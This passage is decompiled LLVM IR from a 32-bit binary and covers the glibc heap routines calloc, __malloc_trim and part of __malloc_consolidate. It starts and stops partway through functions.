  uselistorder i32 %v1_805f042, { 13, 31, 11, 5, 29, 12, 6, 22, 21, 2, 1, 7, 24, 23, 20, 18, 19, 8, 25, 26, 9, 27, 28, 15, 10, 16, 17, 0, 30, 14, 3, 32, 34, 33, 4, 35 }
  uselistorder i32 %v1_805ec93, { 0, 2, 1 }
  uselistorder i32 %v0_805ec7c, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 22, 21, 23, 24, 28, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 0, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 56, 51, 52, 55, 54, 53, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_807e480.783, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 4, 3, 2 }
  uselistorder i32 134734164, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_807e160.771, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_807e14c.768 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807e14c.768 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805f3b8, { 1, 0 }
  uselistorder label %dec_label_pc_805f3a7, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805f39a, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805f396, { 1, 0 }
  uselistorder label %dec_label_pc_805f38c, { 1, 0 }
  uselistorder label %dec_label_pc_805f337, { 1, 0 }
  uselistorder label %dec_label_pc_805f30e, { 1, 0 }
  uselistorder label %dec_label_pc_805f2fb, { 1, 0 }
  uselistorder label %dec_label_pc_805f2e9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805f27b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f276, { 1, 0 }
  uselistorder label %dec_label_pc_805f25a, { 1, 0 }
  uselistorder label %dec_label_pc_805f203, { 1, 0 }
  uselistorder label %dec_label_pc_805f1ec, { 1, 0 }
  uselistorder label %dec_label_pc_805f1d5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805f18c, { 1, 0 }
  uselistorder label %dec_label_pc_805f158, { 1, 0 }
  uselistorder label %dec_label_pc_805f14b, { 1, 0 }
  uselistorder label %dec_label_pc_805f10c, { 1, 0 }
  uselistorder label %dec_label_pc_805f0e5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805f0c9, { 1, 0 }
  uselistorder label %dec_label_pc_805f0b0, { 1, 0 }
  uselistorder label %dec_label_pc_805f092, { 1, 0 }
  uselistorder label %dec_label_pc_805efad, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805efa5, { 1, 0 }
  uselistorder label %dec_label_pc_805ef8e, { 1, 0 }
  uselistorder label %dec_label_pc_805ef21, { 1, 0 }
  uselistorder label %dec_label_pc_805ef26.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805eefa, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ee81, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_805ee08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805edf1, { 1, 0 }
  uselistorder label %dec_label_pc_805ed5f, { 1, 0 }
  uselistorder label %dec_label_pc_805ee30.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ed2c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805ecaa, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805f3c4 = load i32, i32* @edi, align 4
  %v0_805f3c6 = load i32, i32* @ebx, align 4
  %v12_805f3c7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_805f3ca = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_805f3d4 = sdiv i64 %sext, 4294967296
  %v3_805f3d4 = sext i32 %arg2 to i64
  %v4_805f3d4 = mul nsw i64 %v3_805f3d4, %v2_805f3d4
  %v5_805f3d4 = trunc i64 %v4_805f3d4 to i32
  store i32 %v5_805f3d4, i32* @ebx, align 4
  %v2_805f3d7 = icmp eq i32 %v4_805f3ca, 0
  br i1 %v2_805f3d7, label %dec_label_pc_805f3f9, label %dec_label_pc_805f3db

dec_label_pc_805f3db:                             ; preds = %entry
  store i32 %v4_805f3ca, i32* @edi, align 4
  %div = udiv i32 %v5_805f3d4, %v4_805f3ca
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_805f3e3 = icmp eq i32 %div, %arg2
  br i1 %v12_805f3e3, label %dec_label_pc_805f3f9, label %dec_label_pc_805f3e7

dec_label_pc_805f3e7:                             ; preds = %dec_label_pc_805f3db
  %v1_805f3e7 = call i32 @__errno_location(i32 %v0_805f3c6)
  store i32 %v1_805f3e7, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805f3ee = inttoptr i32 %v1_805f3e7 to i32*
  store i32 12, i32* %v1_805f3ee, align 4
  br label %dec_label_pc_805f4af

dec_label_pc_805f3f9:                             ; preds = %dec_label_pc_805f3db, %entry
  store i32 %v12_805f3c7, i32* %eax.global-to-local, align 4
  %v4_805f409 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v4_805f409, i32* %eax.global-to-local, align 4
  %v1_805f415 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v1_805f415, i32* %eax.global-to-local, align 4
  %v0_805f41a = load i32, i32* @ebx, align 4
  %v1_805f41d = call i32 @malloc(i32 %v0_805f41a)
  store i32 %v1_805f41d, i32* %eax.global-to-local, align 4
  store i32 %v1_805f41d, i32* @ebx, align 4
  %v1_805f427 = icmp eq i32 %v1_805f41d, 0
  br i1 %v1_805f427, label %dec_label_pc_805f49e, label %dec_label_pc_805f42b

dec_label_pc_805f42b:                             ; preds = %dec_label_pc_805f3f9
  %v1_805f42b = add i32 %v1_805f41d, -4
  %v2_805f42b = inttoptr i32 %v1_805f42b to i32*
  %v3_805f42b = load i32, i32* %v2_805f42b, align 4
  store i32 %v3_805f42b, i32* %eax.global-to-local, align 4
  %v2_805f42e = and i32 %v3_805f42b, 2
  %v3_805f42e = icmp eq i32 %v2_805f42e, 0
  %v1_805f430 = icmp eq i1 %v3_805f42e, false
  br i1 %v1_805f430, label %dec_label_pc_805f49e, label %dec_label_pc_805f432

dec_label_pc_805f432:                             ; preds = %dec_label_pc_805f42b
  %v1_805f4323 = add i32 %v3_805f42b, -4
  %v1_805f435 = and i32 %v1_805f4323, -4
  %v2_805f43a = udiv i32 %v1_805f435, 4
  store i32 %v2_805f43a, i32* %eax.global-to-local, align 4
  %v5_805f43d = icmp ult i32 %v1_805f435, 36
  %tmp = and i32 %v1_805f4323, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_805f440 = or i1 %v5_805f43d, %tmp18
  br i1 %v2_805f440, label %dec_label_pc_805f451, label %dec_label_pc_805f442

dec_label_pc_805f442:                             ; preds = %dec_label_pc_805f432
  %v3_805f447 = inttoptr i32 %v1_805f41d to i8*
  %v4_805f447 = call i32 @__GI_memset(i8* %v3_805f447, i32 0, i32 %v1_805f435)
  store i32 %v4_805f447, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f49e

dec_label_pc_805f451:                             ; preds = %dec_label_pc_805f432
  %v1_805f451 = inttoptr i32 %v1_805f41d to i32*
  store i32 0, i32* %v1_805f451, align 4
  %v0_805f457 = load i32, i32* @ebx, align 4
  %v1_805f457 = add i32 %v0_805f457, 4
  %v2_805f457 = inttoptr i32 %v1_805f457 to i32*
  store i32 0, i32* %v2_805f457, align 4
  %v0_805f45e = load i32, i32* @ebx, align 4
  %v1_805f45e = add i32 %v0_805f45e, 8
  %v2_805f45e = inttoptr i32 %v1_805f45e to i32*
  store i32 0, i32* %v2_805f45e, align 4
  %v0_805f465 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_805f465, 5
  br i1 %tmp15, label %dec_label_pc_805f49e, label %dec_label_pc_805f46a

dec_label_pc_805f46a:                             ; preds = %dec_label_pc_805f451
  %v0_805f46a = load i32, i32* @ebx, align 4
  %v1_805f46a = add i32 %v0_805f46a, 12
  %v2_805f46a = inttoptr i32 %v1_805f46a to i32*
  store i32 0, i32* %v2_805f46a, align 4
  %v0_805f471 = load i32, i32* @ebx, align 4
  %v1_805f471 = add i32 %v0_805f471, 16
  %v2_805f471 = inttoptr i32 %v1_805f471 to i32*
  store i32 0, i32* %v2_805f471, align 4
  %v0_805f478 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_805f478, 7
  br i1 %tmp16, label %dec_label_pc_805f49e, label %dec_label_pc_805f47d

dec_label_pc_805f47d:                             ; preds = %dec_label_pc_805f46a
  %v0_805f47d = load i32, i32* @ebx, align 4
  %v1_805f47d = add i32 %v0_805f47d, 20
  %v2_805f47d = inttoptr i32 %v1_805f47d to i32*
  store i32 0, i32* %v2_805f47d, align 4
  %v0_805f484 = load i32, i32* @ebx, align 4
  %v1_805f484 = add i32 %v0_805f484, 24
  %v2_805f484 = inttoptr i32 %v1_805f484 to i32*
  store i32 0, i32* %v2_805f484, align 4
  %v0_805f48b = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_805f48b, 9
  br i1 %tmp17, label %dec_label_pc_805f49e, label %dec_label_pc_805f490

dec_label_pc_805f490:                             ; preds = %dec_label_pc_805f47d
  %v0_805f490 = load i32, i32* @ebx, align 4
  %v1_805f490 = add i32 %v0_805f490, 28
  %v2_805f490 = inttoptr i32 %v1_805f490 to i32*
  store i32 0, i32* %v2_805f490, align 4
  %v0_805f497 = load i32, i32* @ebx, align 4
  %v1_805f497 = add i32 %v0_805f497, 32
  %v2_805f497 = inttoptr i32 %v1_805f497 to i32*
  store i32 0, i32* %v2_805f497, align 4
  br label %dec_label_pc_805f49e

dec_label_pc_805f49e:                             ; preds = %dec_label_pc_805f47d, %dec_label_pc_805f46a, %dec_label_pc_805f451, %dec_label_pc_805f42b, %dec_label_pc_805f3f9, %dec_label_pc_805f442, %dec_label_pc_805f490
  store i32 %v12_805f3c7, i32* %eax.global-to-local, align 4
  %v3_805f4a7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_805f4a7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f4af

dec_label_pc_805f4af:                             ; preds = %dec_label_pc_805f3e7, %dec_label_pc_805f49e
  %v0_805f4b2 = load i32, i32* @ebx, align 4
  store i32 %v0_805f4b2, i32* %eax.global-to-local, align 4
  store i32 %v0_805f3c6, i32* @ebx, align 4
  store i32 %v0_805f3c4, i32* @edi, align 4
  ret i32 %v0_805f4b2

; uselistorder directives
  uselistorder i32 %v1_805f435, { 2, 1, 0 }
  uselistorder i32 %v1_805f41d, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 10, 11, 12, 14, 13 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805f4af, { 1, 0 }
  uselistorder label %dec_label_pc_805f49e, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805f4bb = load i32, i32* @ebx, align 4
  %v0_805f4bf = load i32, i32* @edx, align 4
  store i32 %v0_805f4bf, i32* %ebp.global-to-local, align 4
  %v1_805f4c1 = add i32 %v0_805f4bf, 860
  %v2_805f4c1 = inttoptr i32 %v1_805f4c1 to i32*
  %v3_805f4c1 = load i32, i32* %v2_805f4c1, align 4
  store i32 %v3_805f4c1, i32* @ecx, align 4
  %v1_805f4c7 = add i32 %v0_805f4bf, 44
  %v2_805f4c7 = inttoptr i32 %v1_805f4c7 to i32*
  %v3_805f4c7 = load i32, i32* %v2_805f4c7, align 4
  %v1_805f4ca = add i32 %v3_805f4c7, 4
  %v2_805f4ca = inttoptr i32 %v1_805f4ca to i32*
  %v3_805f4ca = load i32, i32* %v2_805f4ca, align 4
  %v1_805f4cd = and i32 %v3_805f4ca, -4
  store i32 %v1_805f4cd, i32* @esi, align 4
  %v1_805f4d2 = load i32, i32* @eax, align 4
  %v2_805f4d2 = add i32 %v3_805f4c1, -17
  %v2_805f4d4 = add i32 %v2_805f4d2, %v1_805f4cd
  %v3_805f4d4 = sub i32 %v2_805f4d4, %v1_805f4d2
  %div = udiv i32 %v3_805f4d4, %v3_805f4c1
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_805f4dc = add i32 %div, -1
  %v4_805f4df = mul i32 %v1_805f4dc, %v3_805f4c1
  store i32 %v4_805f4df, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805f4df, 1
  br i1 %tmp11, label %dec_label_pc_805f53b, label %dec_label_pc_805f4e6

dec_label_pc_805f4e6:                             ; preds = %entry
  %v1_805f4eb = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f4eb, i32* %edi.global-to-local, align 4
  %v0_805f4f2 = load i32, i32* @esi, align 4
  store i32 %v0_805f4f2, i32* %eax.global-to-local, align 4
  %v1_805f4f4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805f4f4 = add i32 %v1_805f4f4, 44
  %v3_805f4f4 = inttoptr i32 %v2_805f4f4 to i32*
  %v4_805f4f4 = load i32, i32* %v3_805f4f4, align 4
  %v5_805f4f4 = add i32 %v4_805f4f4, %v0_805f4f2
  store i32 %v5_805f4f4, i32* %eax.global-to-local, align 4
  %v12_805f4fa = icmp eq i32 %v1_805f4eb, %v5_805f4f4
  %v1_805f4fc = icmp eq i1 %v12_805f4fa, false
  br i1 %v1_805f4fc, label %dec_label_pc_805f53b, label %dec_label_pc_805f4fe

dec_label_pc_805f4fe:                             ; preds = %dec_label_pc_805f4e6
  %v1_805f501 = sub i32 0, %v4_805f4df
  store i32 %v1_805f501, i32* @ebx, align 4
  %v1_805f504 = call i32 @__GI_sbrk(i32 %v1_805f501)
  store i32 %v1_805f504, i32* %eax.global-to-local, align 4
  %v1_805f510 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f510, i32* %eax.global-to-local, align 4
  %v10_805f518 = icmp eq i32 %v1_805f510, -1
  br i1 %v10_805f518, label %dec_label_pc_805f53b, label %dec_label_pc_805f51d

dec_label_pc_805f51d:                             ; preds = %dec_label_pc_805f4fe
  %v0_805f51d = load i32, i32* %edi.global-to-local, align 4
  %v2_805f51f = sub i32 %v0_805f51d, %v1_805f510
  %v12_805f51f = icmp eq i32 %v2_805f51f, 0
  store i32 %v2_805f51f, i32* @ecx, align 4
  br i1 %v12_805f51f, label %dec_label_pc_805f53b, label %dec_label_pc_805f523

dec_label_pc_805f523:                             ; preds = %dec_label_pc_805f51d
  %v0_805f523 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805f523 = add i32 %v0_805f523, 44
  %v2_805f523 = inttoptr i32 %v1_805f523 to i32*
  %v3_805f523 = load i32, i32* %v2_805f523, align 4
  store i32 %v3_805f523, i32* %eax.global-to-local, align 4
  %v1_805f526 = add i32 %v0_805f523, 872
  %v2_805f526 = inttoptr i32 %v1_805f526 to i32*
  %v3_805f526 = load i32, i32* %v2_805f526, align 4
  %v5_805f526 = sub i32 %v3_805f526, %v2_805f51f
  store i32 %v5_805f526, i32* %v2_805f526, align 4
  %v0_805f52c = load i32, i32* @esi, align 4
  %v1_805f52c = load i32, i32* @ecx, align 4
  %v2_805f52c = sub i32 %v0_805f52c, %v1_805f52c
  %v1_805f52e = or i32 %v2_805f52c, 1
  %v1_805f531 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f531 = add i32 %v1_805f531, 4
  %v3_805f531 = inttoptr i32 %v2_805f531 to i32*
  store i32 %v1_805f52e, i32* %v3_805f531, align 4
  br label %dec_label_pc_805f53d

dec_label_pc_805f53b:                             ; preds = %dec_label_pc_805f51d, %dec_label_pc_805f4fe, %dec_label_pc_805f4e6, %entry
  br label %dec_label_pc_805f53d

dec_label_pc_805f53d:                             ; preds = %dec_label_pc_805f523, %dec_label_pc_805f53b
  %storemerge = phi i32 [ 1, %dec_label_pc_805f523 ], [ 0, %dec_label_pc_805f53b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805f4bb, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805f510, { 1, 0, 2 }
  uselistorder i32 %v4_805f4df, { 1, 2, 0 }
  uselistorder i32 %v3_805f4c1, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_805f53d, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805f545 = load i32, i32* @ebp, align 4
  %v0_805f546 = load i32, i32* @edi, align 4
  %v0_805f547 = load i32, i32* @esi, align 4
  %v0_805f548 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805f550 = load i32, i32* %arg1, align 4
  store i32 %v2_805f550, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805f557 = icmp eq i32 %v2_805f550, 0
  br i1 %v1_805f557, label %dec_label_pc_805f680.preheader, label %dec_label_pc_805f55f

dec_label_pc_805f680.preheader:                   ; preds = %entry
  %v3_805f675 = add i32 %tmp11, 44
  br label %dec_label_pc_805f671

dec_label_pc_805f55f:                             ; preds = %entry
  %v1_805f563 = and i32 %v2_805f550, -3
  store i32 %v1_805f563, i32* %arg1, align 4
  %v1_805f568 = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805f584 = udiv i32 %v1_805f563, 8
  %v2_805f587 = mul nuw i32 %v2_805f584, 4
  %v3_805f587 = add i32 %tmp11, -4
  %v4_805f587 = add i32 %v3_805f587, %v2_805f587
  store i32 %v4_805f587, i32* %eax.global-to-local, align 4
  %v2_805f64e = add i32 %tmp11, 44
  %v3_805f64e = inttoptr i32 %v2_805f64e to i32*
  %v1_805f621 = add i32 %tmp11, 60
  %v2_805f621 = inttoptr i32 %v1_805f621 to i32*
  br label %dec_label_pc_805f58f

dec_label_pc_805f58f:                             ; preds = %dec_label_pc_805f667, %dec_label_pc_805f55f
  %v0_805f59d.in = phi i32 [ %tmp11, %dec_label_pc_805f55f ], [ %v0_805f59d, %dec_label_pc_805f667 ]
  %v0_805f59d = add i32 %v0_805f59d.in, 4
  store i32 %v0_805f59d, i32* %eax.global-to-local, align 4
  %v1_805f593 = inttoptr i32 %v0_805f59d to i32*
  %v2_805f593 = load i32, i32* %v1_805f593, align 4
  store i32 %v2_805f593, i32* @ecx, align 4
  %v1_805f595 = icmp eq i32 %v2_805f593, 0
  br i1 %v1_805f595, label %dec_label_pc_805f65d, label %dec_label_pc_805f59d

dec_label_pc_805f59d:                             ; preds = %dec_label_pc_805f58f
  store i32 0, i32* %v1_805f593, align 4
  %v0_805f5a3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805f5a3

dec_label_pc_805f5a3:                             ; preds = %dec_label_pc_805f651, %dec_label_pc_805f59d
  %v0_805f5c0 = phi i32 [ %v3_805f5a3, %dec_label_pc_805f651 ], [ %v0_805f5a3.pre, %dec_label_pc_805f59d ]
  %v1_805f5a3 = add i32 %v0_805f5c0, 8
  %v2_805f5a3 = inttoptr i32 %v1_805f5a3 to i32*
  %v3_805f5a3 = load i32, i32* %v2_805f5a3, align 4
  store i32 %v3_805f5a3, i32* %edx.global-to-local, align 4
  %v1_805f5aa = add i32 %v0_805f5c0, 4
  %v2_805f5aa = inttoptr i32 %v1_805f5aa to i32*
  %v3_805f5aa = load i32, i32* %v2_805f5aa, align 4
  store i32 %v3_805f5aa, i32* %eax.global-to-local, align 4
  %v1_805f5af = and i32 %v3_805f5aa, -2
  store i32 %v1_805f5af, i32* @edi, align 4
  %v2_805f5b2 = urem i32 %v3_805f5aa, 2
  %v3_805f5b2 = icmp eq i32 %v2_805f5b2, 0
  %v2_805f5b4 = add i32 %v1_805f5af, %v0_805f5c0
  store i32 %v2_805f5b4, i32* @ebx, align 4
  %v1_805f5b7 = add i32 %v2_805f5b4, 4
  %v2_805f5b7 = inttoptr i32 %v1_805f5b7 to i32*
  %v3_805f5b7 = load i32, i32* %v2_805f5b7, align 4
  store i32 %v3_805f5b7, i32* %edx.global-to-local, align 4
  %v1_805f5be = icmp eq i1 %v3_805f5b2, false
  br i1 %v1_805f5be, label %dec_label_pc_805f5e0, label %dec_label_pc_805f5c0

dec_label_pc_805f5c0:                             ; preds = %dec_label_pc_805f5a3
  %v1_805f5c0 = inttoptr i32 %v0_805f5c0 to i32*
  %v2_805f5c0 = load i32, i32* %v1_805f5c0, align 4
  store i32 %v2_805f5c0, i32* @ebp, align 4
  %v2_805f5c4 = sub i32 %v0_805f5c0, %v2_805f5c0
  store i32 %v2_805f5c4, i32* %eax.global-to-local, align 4
  %v1_805f5c6 = add i32 %v2_805f5c4, 8
  %v2_805f5c6 = inttoptr i32 %v1_805f5c6 to i32*
  %v3_805f5c6 = load i32, i32* %v2_805f5c6, align 4
  store i32 %v3_805f5c6, i32* @esi, align 4
  %v1_805f5c9 = add i32 %v2_805f5c4, 12
  %v2_805f5c9 = inttoptr i32 %v1_805f5c9 to i32*
  %v3_805f5c9 = load i32, i32* %v2_805f5c9, align 4
  store i32 %v3_805f5c9, i32* %edx.global-to-local, align 4
  %v1_805f5cc = add i32 %v3_805f5c6, 12
  %v2_805f5cc = inttoptr i32 %v1_805f5cc to i32*
  %v3_805f5cc = load i32, i32* %v2_805f5cc, align 4
  store i32 %v3_805f5cc, i32* @ecx, align 4
  %v12_805f5cf = icmp eq i32 %v3_805f5cc, %v2_805f5c4
  %v1_805f5d1 = icmp eq i1 %v12_805f5cf, false
  br i1 %v1_805f5d1, label %dec_label_pc_805f610, label %dec_label_pc_805f5d3

dec_label_pc_805f5d3:                             ; preds = %dec_label_pc_805f5c0
  %v1_805f5d3 = add i32 %v3_805f5c9, 8
  %v2_805f5d3 = inttoptr i32 %v1_805f5d3 to i32*
  %v3_805f5d3 = load i32, i32* %v2_805f5d3, align 4
  %v15_805f5d3 = icmp eq i32 %v3_805f5d3, %v3_805f5cc
  %v1_805f5d6 = icmp eq i1 %v15_805f5d3, false
  br i1 %v1_805f5d6, label %dec_label_pc_805f610, label %dec_label_pc_805f5d8

dec_label_pc_805f5d8:                             ; preds = %dec_label_pc_805f5d3
  %v2_805f5d8 = add i32 %v2_805f5c0, %v1_805f5af
  store i32 %v2_805f5d8, i32* @edi, align 4
  store i32 %v3_805f5c9, i32* %v2_805f5cc, align 4
  %v0_805f5dd = load i32, i32* @esi, align 4
  %v1_805f5dd = load i32, i32* %edx.global-to-local, align 4
  %v2_805f5dd = add i32 %v1_805f5dd, 8
  %v3_805f5dd = inttoptr i32 %v2_805f5dd to i32*
  store i32 %v0_805f5dd, i32* %v3_805f5dd, align 4
  %v0_805f5eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805f5e0

dec_label_pc_805f5e0:                             ; preds = %dec_label_pc_805f5a3, %dec_label_pc_805f5d8
  %v1_805f5f4 = phi i32 [ %v2_805f5b4, %dec_label_pc_805f5a3 ], [ %v0_805f5eb.pre, %dec_label_pc_805f5d8 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805f5e8 = and i32 %v3_805f5b7, -4
  store i32 %v1_805f5e8, i32* @ebp, align 4
  %v4_805f5eb = load i32, i32* %v3_805f64e, align 4
  %v15_805f5eb = icmp eq i32 %v1_805f5f4, %v4_805f5eb
  br i1 %v15_805f5eb, label %dec_label_pc_805f641, label %dec_label_pc_805f5f0

dec_label_pc_805f5f0:                             ; preds = %dec_label_pc_805f5e0
  %v2_805f5f0 = add i32 %v1_805f5f4, 4
  %v3_805f5f0 = add i32 %v2_805f5f0, %v1_805f5e8
  %v4_805f5f0 = inttoptr i32 %v3_805f5f0 to i32*
  %v5_805f5f0 = load i32, i32* %v4_805f5f0, align 4
  store i32 %v5_805f5f0, i32* %eax.global-to-local, align 4
  %v3_805f5f4 = inttoptr i32 %v2_805f5f0 to i32*
  store i32 %v1_805f5e8, i32* %v3_805f5f4, align 4
  %v0_805f5f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f5f7 = urem i32 %v0_805f5f7, 2
  %v2_805f5f7 = icmp eq i32 %v1_805f5f7, 0
  store i32 %v1_805f5f7, i32* %eax.global-to-local, align 4
  %v1_805f5fc = icmp eq i1 %v2_805f5f7, false
  br i1 %v1_805f5fc, label %dec_label_pc_805f61d, label %dec_label_pc_805f5fe

dec_label_pc_805f5fe:                             ; preds = %dec_label_pc_805f5f0
  %v0_805f5fe = load i32, i32* @ebx, align 4
  %v1_805f5fe = add i32 %v0_805f5fe, 8
  %v2_805f5fe = inttoptr i32 %v1_805f5fe to i32*
  %v3_805f5fe = load i32, i32* %v2_805f5fe, align 4
  store i32 %v3_805f5fe, i32* @edx, align 4
  %v1_805f601 = add i32 %v0_805f5fe, 12
  %v2_805f601 = inttoptr i32 %v1_805f601 to i32*
  %v3_805f601 = load i32, i32* %v2_805f601, align 4
  store i32 %v3_805f601, i32* %eax.global-to-local, align 4
  %v1_805f604 = add i32 %v3_805f5fe, 12
  %v2_805f604 = inttoptr i32 %v1_805f604 to i32*
  %v3_805f604 = load i32, i32* %v2_805f604, align 4
  store i32 %v3_805f604, i32* @esi, align 4
  %v12_805f607 = icmp eq i32 %v3_805f604, %v0_805f5fe
  %v1_805f609 = icmp eq i1 %v12_805f607, false
  br i1 %v1_805f609, label %dec_label_pc_805f610, label %dec_label_pc_805f60b

dec_label_pc_805f60b:                             ; preds = %dec_label_pc_805f5fe
  %v1_805f60b = add i32 %v3_805f601, 8
  %v2_805f60b = inttoptr i32 %v1_805f60b to i32*
  %v3_805f60b = load i32, i32* %v2_805f60b, align 4
  %v15_805f60b = icmp eq i32 %v3_805f60b, %v3_805f604
  br i1 %v15_805f60b, label %dec_label_pc_805f615, label %dec_label_pc_805f610

dec_label_pc_805f610:                             ; preds = %dec_label_pc_805f60b, %dec_label_pc_805f5fe, %dec_label_pc_805f5d3, %dec_label_pc_805f5c0
  %v0_805f610 = call i32 @abort()
  store i32 %v0_805f610, i32* %eax.global-to-local, align 4
  %v1_805f617.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805f615

dec_label_pc_805f615:                             ; preds = %dec_label_pc_805f60b, %dec_label_pc_805f610
  %v1_805f617 = phi i32 [ %v3_805f5fe, %dec_label_pc_805f60b ], [ %v1_805f617.pre, %dec_label_pc_805f610 ]
  %v0_805f617 = phi i32 [ %v3_805f601, %dec_label_pc_805f60b ], [ %v0_805f610, %dec_label_pc_805f610 ]
  %v0_805f615 = load i32, i32* @edi, align 4
  %v1_805f615 = load i32, i32* @ebp, align 4
  %v2_805f615 = add i32 %v1_805f615, %v0_805f615
  store i32 %v2_805f615, i32* @edi, align 4
  %v2_805f617 = add i32 %v1_805f617, 12
  %v3_805f617 = inttoptr i32 %v2_805f617 to i32*
  store i32 %v0_805f617, i32* %v3_805f617, align 4
  %v0_805f61a = load i32, i32* @edx, align 4
  %v1_805f61a = load i32, i32* %eax.global-to-local, align 4
  %v2_805f61a = add i32 %v1_805f61a, 8
  %v3_805f61a = inttoptr i32 %v2_805f61a to i32*
  store i32 %v0_805f61a, i32* %v3_805f61a, align 4
  br label %dec_label_pc_805f61d

dec_label_pc_805f61d:                             ; preds = %dec_label_pc_805f5f0, %dec_label_pc_805f615
  store i32 %v1_805f568, i32* %eax.global-to-local, align 4
  %v3_805f621 = load i32, i32* %v2_805f621, align 4
  store i32 %v3_805f621, i32* %edx.global-to-local, align 4
  %v0_805f624 = load i32, i32* @ecx, align 4
  store i32 %v0_805f624, i32* %v2_805f621, align 4
  %v0_805f627 = load i32, i32* @edi, align 4
